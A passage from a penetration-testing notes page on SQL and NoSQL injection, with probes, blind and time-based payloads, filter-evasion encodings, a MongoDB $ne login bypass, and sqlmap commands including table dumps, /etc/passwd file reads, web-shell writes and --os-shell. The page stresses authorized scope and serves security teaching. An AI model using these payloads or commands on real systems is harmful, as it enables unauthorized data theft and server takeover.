+<div class="language-sql highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="k">UNION</span><span class="w">  </span><span class="k">SELECT</span><span class="w">  </span><span class="k">NULL</span><span class="p">,</span><span class="k">current_user</span><span class="p">,</span><span class="k">NULL</span>
+</span></code></pre></div>
+<p>Avoid dumping user tables unless the scope explicitly allows it.</p>
+<hr />
+<h2 id="error-based-sqli">Error-Based SQLi</h2>
+<p>Error-based SQLi uses database errors to prove injection or leak information.</p>
+<p>Signals include:</p>
+<ul>
+<li>
+<p>SQL syntax errors</p>
+</li>
+<li>
+<p>type conversion errors</p>
+</li>
+<li>
+<p>stack traces</p>
+</li>
+<li>
+<p>database driver messages</p>
+</li>
+<li>
+<p>ORM exceptions</p>
+</li>
+<li>
+<p>column count errors</p>
+</li>
+<li>
+<p>unknown table or column errors</p>
+</li>
+</ul>
+<p>Useful testing idea:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="err">&#39;</span>
+</span></code></pre></div>
+<p>Then compare with:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="s1">&#39;&#39;</span>
+</span></code></pre></div>
+<p>If a single quote breaks the query and two quotes repair it, that is a strong signal.</p>
+<h3 id="error-handling-note">Error Handling Note</h3>
+<p>Verbose database errors are useful for testers but dangerous in production. Applications should log detailed errors server-side and show generic errors to users.</p>
+<hr />
+<h2 id="blind-sqli">Blind SQLi</h2>
+<p>Blind SQLi exists when the query is injectable but results are not directly returned.</p>
+<h3 id="boolean-based-blind-sqli">Boolean-Based Blind SQLi</h3>
+<p>Example logic:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="s1">&#39; AND SUBSTRING((SELECT version()),1,1)=&#39;</span><span class="mi">8</span>
+</span></code></pre></div>
+<p>If the response changes only when the condition is true, the vulnerability can be exploited one bit or character at a time.</p>
+<p>Better for proof-of-risk:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="s1">&#39; AND &#39;</span><span class="n">a</span><span class="s1">&#39;=&#39;</span><span class="n">a</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="s1">&#39; AND &#39;</span><span class="n">a</span><span class="s1">&#39;=&#39;</span><span class="n">b</span>
+</span></code></pre></div>
+<h3 id="time-based-blind-sqli">Time-Based Blind SQLi</h3>
+<p>Time-based SQLi uses a delay as the confirmation signal.</p>
+<table>
+<thead>
+<tr>
+<th>Database</th>
+<th>Example delay function</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MySQL</td>
+<td><code>SLEEP(5)</code></td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td><code>pg_sleep(5)</code></td>
+</tr>
+<tr>
+<td>SQL Server</td>
+<td><code>WAITFOR DELAY '0:0:5'</code></td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td><code>DBMS_LOCK.SLEEP(5)</code></td>
+</tr>
+</tbody>
+</table>
+<p>Use short delays in real testing:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>3 to 5 seconds is usually enough
+</span></code></pre></div>
+<p>Avoid long delays and high concurrency because time-based testing can degrade service.</p>
+<h3 id="out-of-band-sqli">Out-of-Band SQLi</h3>
+<p>Out-of-band SQLi uses DNS or HTTP callbacks to a controlled listener such as Burp Collaborator or another OAST service.</p>
+<p>This is useful when:</p>
+<ul>
+<li>
+<p>the application response never changes</p>
+</li>
+<li>
+<p>errors are hidden</p>
+</li>
+<li>
+<p>timing is unreliable</p>
+</li>
+<li>
+<p>the query runs asynchronously</p>
+</li>
+</ul>
+<p>Only use OAST endpoints that are approved by the engagement scope.</p>
+<hr />
+<h2 id="second-order-sqli">Second-Order SQLi</h2>
+<p>Second-order SQLi happens when the application safely accepts input at one point, stores it, and later uses it unsafely in a different SQL query.</p>
+<p>Common places:</p>
+<table>
+<thead>
+<tr>
+<th>Stored input</th>
+<th>Later trigger</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Registration field</td>
+<td>Profile page</td>
+</tr>
+<tr>
+<td>Display name</td>
+<td>Admin user management</td>
+</tr>
+<tr>
+<td>Email address</td>
+<td>Password reset or notification job</td>
+</tr>
+<tr>
+<td>Support ticket</td>
+<td>Agent/admin panel</td>
+</tr>
+<tr>
+<td>Import row</td>
+<td>Background processing job</td>
+</tr>
+<tr>
+<td>Product field</td>
+<td>Search index or report export</td>
+</tr>
+</tbody>
+</table>
+<p>Testing approach:</p>
+<ol>
+<li>
+<p>Put a unique marker or SQLi probe into a stored field.</p>
+</li>
+<li>
+<p>Use the application normally.</p>
+</li>
+<li>
+<p>Visit pages or functions that later process that field.</p>
+</li>
+<li>
+<p>Check for errors, behavior changes, or delayed responses.</p>
+</li>
+</ol>
+<p>With sqlmap, second-order testing can use options such as:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>sqlmap<span class="w">  </span>-r<span class="w">  </span>req.txt<span class="w">  </span>--second-req<span class="w">  </span>second_req.txt<span class="w">  </span>--batch
+</span></code></pre></div>
+<hr />
+<h2 id="stacked-queries">Stacked Queries</h2>
+<p>Stacked queries mean sending more than one SQL statement in the same injection point.</p>
+<p>Example shape:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="k">SELECT</span><span class="w">  </span><span class="k">version</span><span class="p">()</span>
+</span></code></pre></div>
+<p>This depends on:</p>
+<ul>
+<li>
+<p>database type</p>
+</li>
+<li>
+<p>database driver</p>
+</li>
+<li>
+<p>application framework</p>
+</li>
+<li>
+<p>database permissions</p>
+</li>
+<li>
+<p>whether multi-statements are enabled</p>
+</li>
+</ul>
+<p>Stacked queries can become destructive quickly. Do not test <code>INSERT</code>, <code>UPDATE</code>, <code>DELETE</code>, <code>DROP</code>, file write, or OS-level functions unless the rules of engagement explicitly allow it.</p>
+<hr />
+<h2 id="sql-injection-filter-evasion-unicode-normalization">SQL Injection Filter Evasion - Unicode Normalization</h2>
+<p>Unicode normalization can turn visually unusual characters into normal SQL syntax characters after some layer of the application processes them.</p>
+<p>This can matter when:</p>
+<ul>
+<li>
+<p>the frontend filters one representation</p>
+</li>
+<li>
+<p>the backend normalizes input later</p>
+</li>
+<li>
+<p>the WAF and application normalize differently</p>
+</li>
+<li>
+<p>the database receives a normalized dangerous character</p>
+</li>
+</ul>
+<p>Useful references:</p>
+<ul>
+<li>
+<p><a href="https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/">AppCheck Unicode Normalization Vulnerabilities</a></p>
+</li>
+<li>
+<p><a href="https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html">Unicode Normalization Table</a></p>
+</li>
+<li>
+<p><a href="https://0xacb.com/normalization_table">0xacb Normalization Table</a></p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Character</th>
+<th>Unicode-normalized encoding example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>o</code></td>
+<td><code>%e1%b4%bc</code></td>
+</tr>
+<tr>
+<td><code>r</code></td>
+<td><code>%e1%b4%bf</code></td>
+</tr>
+<tr>
+<td><code>1</code></td>
+<td><code>%c2%b9</code></td>
+</tr>
+<tr>
+<td><code>=</code></td>
+<td><code>%e2%81%bc</code></td>
+</tr>
+<tr>
+<td><code>/</code></td>
+<td><code>%ef%bc%8f</code></td>
+</tr>
+<tr>
+<td><code>-</code></td>
+<td><code>%ef%b9%a3</code></td>
+</tr>
+<tr>
+<td><code>#</code></td>
+<td><code>%ef%b9%9f</code></td>
+</tr>
+<tr>
+<td><code>*</code></td>
+<td><code>%ef%b9%a1</code></td>
+</tr>
+<tr>
+<td><code>'</code></td>
+<td><code>%ef%bc%87</code></td>
+</tr>
+<tr>
+<td><code>"</code></td>
+<td><code>%ef%bc%82</code></td>
+</tr>
+<tr>
+<td><code>|</code></td>
+<td><code>%ef%bd%9c</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="other-evasion-ideas">Other Evasion Ideas</h3>
+<table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>Example idea</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Case variation</td>
+<td><code>UnIoN SeLeCt</code></td>
+</tr>
+<tr>
+<td>Inline comments</td>
+<td><code>UN/**/ION SEL/**/ECT</code></td>
+</tr>
+<tr>
+<td>Whitespace changes</td>
+<td>tabs, newlines, comments</td>
+</tr>
+<tr>
+<td>URL encoding</td>
+<td><code>%27</code> for <code>'</code></td>
+</tr>
+<tr>
+<td>Double encoding</td>
+<td><code>%2527</code> becomes <code>%27</code>, then <code>'</code></td>
+</tr>
+<tr>
+<td>Alternative operators</td>
+<td><code>LIKE</code>, <code>REGEXP</code>, <code>BETWEEN</code></td>
+</tr>
+<tr>
+<td>String concatenation</td>
+<td>build strings without writing them directly</td>
+</tr>
+<tr>
+<td>DB-specific syntax</td>
+<td>MySQL conditional comments, PostgreSQL casts, SQL Server functions</td>
+</tr>
+</tbody>
+</table>
+<p>Do not rely on bypass tricks before confirming the basic injection point. First understand the query context.</p>
+<hr />
+<h2 id="sqlmap-basics">SQLMap Basics</h2>
+<p>sqlmap automates SQLi detection and exploitation. It is powerful, so start with low-risk options and avoid destructive actions unless explicitly approved.</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sqlmap -h</code></td>
+<td>View the basic help menu.</td>
+</tr>
+<tr>
+<td><code>sqlmap -hh</code></td>
+<td>View the advanced help menu.</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "https://example.com/item?id=1" --batch</code></td>
+<td>Test a URL without interactive prompts.</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "https://example.com/item?id=1" -p id --batch</code></td>
+<td>Test only the <code>id</code> parameter.</td>
+</tr>
+<tr>
+<td><code>sqlmap -r req.txt --batch</code></td>
+<td>Use a raw HTTP request from Burp/ZAP.</td>
+</tr>
+<tr>
+<td><code>sqlmap "https://example.com/" --data "uid=1&amp;name=test" --batch</code></td>
+<td>Test a POST request.</td>
+</tr>
+<tr>
+<td><code>sqlmap "https://example.com/" --data "uid=1*&amp;name=test" --batch</code></td>
+<td>Mark the injection point with <code>*</code>.</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "https://example.com/?id=1" --cookie="SESSION=abc" --batch</code></td>
+<td>Include cookies.</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "https://example.com/?id=1" --method PUT --data "id=1" --batch</code></td>
+<td>Test a PUT request.</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "https://example.com/?id=1" --proxy "http://127.0.0.1:8080" --batch</code></td>
+<td>Proxy traffic through Burp/ZAP.</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "https://example.com/?id=1" --dbms=mysql --batch</code></td>
+<td>Tell sqlmap the DBMS if already known.</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "https://example.com/?id=1" --level=5 --risk=2 --batch</code></td>
+<td>Increase testing coverage. Use carefully.</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "https://example.com/?id=1" --banner --current-user --current-db --is-dba --batch</code></td>
+<td>Basic DB info enumeration.</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "https://example.com/?id=1" --tables -D appdb --batch</code></td>
+<td>Enumerate tables in one database.</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "https://example.com/?id=1" --schema --batch</code></td>
+<td>Enumerate schema metadata.</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "https://example.com/?id=1" --search -T user --batch</code></td>
+<td>Search for table names.</td>
+</tr>
+<tr>
+<td><code>sqlmap -r req.txt --csrf-token "csrf-token" --batch</code></td>
+<td>Handle anti-CSRF token refresh.</td>
+</tr>
+<tr>
+<td><code>sqlmap --list-tampers</code></td>
+<td>List tamper scripts.</td>
+</tr>
+<tr>
+<td><code>sqlmap -r req.txt --second-req second_req.txt --batch</code></td>
+<td>Test a second-order flow.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="high-impact-sqlmap-options">High-Impact sqlmap Options</h3>
+<p>Use only in labs or when explicitly authorized.</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Why high impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sqlmap -u "https://example.com/?id=1" --dump -D appdb -T users --batch</code></td>
+<td>Extracts table data.</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "https://example.com/?id=1" --passwords --batch</code></td>
+<td>Attempts password hash enumeration/cracking.</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "https://example.com/?id=1" --file-read "/etc/passwd" --batch</code></td>
+<td>Attempts local file read through the DBMS.</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "https://example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php" --batch</code></td>
+<td>Attempts file write and can lead to code execution.</td>
+</tr>
+<tr>
+<td><code>sqlmap -u "https://example.com/?id=1" --os-shell</code></td>
+<td>Attempts operating-system command execution.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="practical-sqlmap-tips">Practical sqlmap Tips</h3>
+<ul>
+<li>
+<p>Prefer <code>-r req.txt</code> for real applications because it preserves headers, cookies, JSON bodies, and method.</p>
+</li>
+<li>
+<p>Use <code>-p parameter_name</code> to avoid noisy testing of unrelated parameters.</p>
+</li>
+<li>
+<p>Use <code>--batch</code> only when you know the defaults are acceptable.</p>
+</li>
+<li>
+<p>Use <code>--level</code> and <code>--risk</code> gradually.</p>
+</li>
+<li>
+<p>Use <code>--delay</code>, <code>--timeout</code>, and <code>--retries</code> to avoid aggressive traffic.</p>
+</li>
+<li>
+<p>Do not use <code>--dump-all</code> in production tests.</p>
+</li>
+<li>
+<p>Save evidence with <code>-t traffic.txt</code> when you need an audit trail.</p>
+</li>
+</ul>
+<hr />
+<h2 id="manual-testing-checklist">Manual Testing Checklist</h2>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Question</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Baseline</td>
+<td>What does a normal response look like?</td>
+</tr>
+<tr>
+<td>Reflection</td>
+<td>Does the value appear in the response?</td>
+</tr>
+<tr>
+<td>Error</td>
+<td>Does a quote or special character cause an SQL error?</td>
+</tr>
+<tr>
+<td>Repair</td>
+<td>Does a second quote or comment repair the query?</td>
+</tr>
+<tr>
+<td>Boolean</td>
+<td>Do true and false conditions produce consistent differences?</td>
+</tr>
+<tr>
+<td>Time</td>
+<td>Can a short delay be triggered safely?</td>
+</tr>
+<tr>
+<td>DBMS</td>
+<td>Which database syntax works?</td>
+</tr>
+<tr>
+<td>Scope</td>
+<td>Is data extraction allowed?</td>
+</tr>
+<tr>
+<td>Impact</td>
+<td>What is the minimal proof that shows risk?</td>
+</tr>
+<tr>
+<td>Cleanup</td>
+<td>Did the test create accounts, logs, jobs, or stored payloads that need removal?</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="nosql-injection">NoSQL Injection</h2>
+<p>NoSQL injection is similar in concept: user input changes the meaning of a database query, but the query language is not SQL.</p>
+<p>Common targets:</p>
+<ul>
+<li>
+<p>MongoDB</p>
+</li>
+<li>
+<p>CouchDB</p>
+</li>
+<li>
+<p>Firebase/Firestore rules</p>
+</li>
+<li>
+<p>Elasticsearch queries</p>
+</li>
+<li>
+<p>GraphQL resolvers backed by NoSQL</p>
+</li>
+<li>
+<p>JSON-based API filters</p>
+</li>
+</ul>
+<h3 id="mongodb-style-example">MongoDB-Style Example</h3>
+<p>Unsafe logic may look like this:</p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="nx">db</span><span class="p">.</span><span class="nx">users</span><span class="p">.</span><span class="nx">findOne</span><span class="p">({</span>
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="nx">username</span><span class="o">:</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span>
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="nx">password</span><span class="o">:</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span>
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a><span class="p">})</span>
+</span></code></pre></div>
+<p>If the application accepts objects instead of strings, an attacker might try to send operators instead of normal values.</p>
+<p>Example test shape:</p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="p">{</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="nt">&quot;$ne&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span>
+</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>
+</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="p">},</span>
+</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a>
+</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a>
+</span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a><span class="nt">&quot;$ne&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span>
+</span><span id="__span-31-12"><a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a>
+</span><span id="__span-31-13"><a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a><span class="p">}</span>
+</span><span id="__span-31-14"><a id="__codelineno-31-14" name="__codelineno-31-14" href="#__codelineno-31-14"></a>
+</span><span id="__span-31-15"><a id="__codelineno-31-15" name="__codelineno-31-15" href="#__codelineno-31-15"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>Other common operators to understand:</p>
+<table>
+<thead>
+<tr>
+<th>Operator</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>$ne</code></td>
+<td>Not equal</td>
+</tr>
+<tr>
+<td><code>$gt</code></td>
+<td>Greater than</td>
+</tr>
+<tr>
+<td><code>$lt</code></td>
+<td>Less than</td>
+</tr>
+<tr>
+<td><code>$regex</code></td>
+<td>Regular expression match</td>
+</tr>
+<tr>
+<td><code>$where</code></td>
+<td>JavaScript expression in older/unsafe MongoDB usage</td>
+</tr>
+<tr>
+<td><code>$exists</code></td>
+<td>Field exists</td>
+</tr>
+</tbody>
+</table>
+<h3 id="nosql-testing-signals">NoSQL Testing Signals</h3>
+<table>
+<thead>
+<tr>
+<th>Signal</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Login bypass</td>
+<td>Query matched a user without the correct password.</td>
+</tr>
+<tr>
+<td>More records returned</td>
+<td>Filter logic was changed.</td>
+</tr>
+<tr>
+<td>Error mentioning operators</td>
+<td>Input reached the NoSQL query parser.</td>
+</tr>
+<tr>
+<td>Timing change</td>
+<td>Expensive regex or server-side expression may have executed.</td>
+</tr>
+<tr>
+<td>Different JSON response</td>
+<td>Query behavior changed.</td>
+</tr>
+</tbody>
+</table>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../Initial_Reconnaissance/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Initial Reconnaissance">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Initial Reconnaissance
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../XSS/" class="md-footer__link md-footer__link--next" aria-label="Next: XSS">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                XSS
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "navigation.indexes", "toc.integrate", "navigation.tabs.sticky", "navigation.tracking", "content.code.copy", "content.code.annotate", "navigation.top", "navigation.footer", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+      
+        <script src="data:text/javascript,$(document).ready(function(){var search=$(&#39;.md-search&#39;);if(search.length){var minX=240;var batCont=$(&#39;&lt;div id=&#34;runaway-pixel-bat&#34; class=&#34;go-right&#34; style=&#34;position:absolute;left:&#39;+minX+&#39;px;top:2px;width:70px;height:50px;cursor:default;z-index:9999;user-select:none;&#34;&gt;&lt;/div&gt;&#39;);$(&#39;.md-header__inner&#39;).append(batCont);batCont.on(&#39;mouseenter&#39;,function(){var maxX=search.position().left-110;if(maxX&lt;=minX){maxX=minX+100;}var randomX=Math.floor(Math.random()*(maxX-minX))+minX;var randomY=Math.floor(Math.random()*10)-5;var currentX=batCont.position().left;if(randomX&lt;currentX){batCont.removeClass(&#39;go-right&#39;).addClass(&#39;go-left&#39;);}else{batCont.removeClass(&#39;go-left&#39;).addClass(&#39;go-right&#39;);}batCont.css({left:randomX+&#39;px&#39;,top:randomY+&#39;px&#39;});});}});"></script>
+      
+    
+  </body>
+</html>
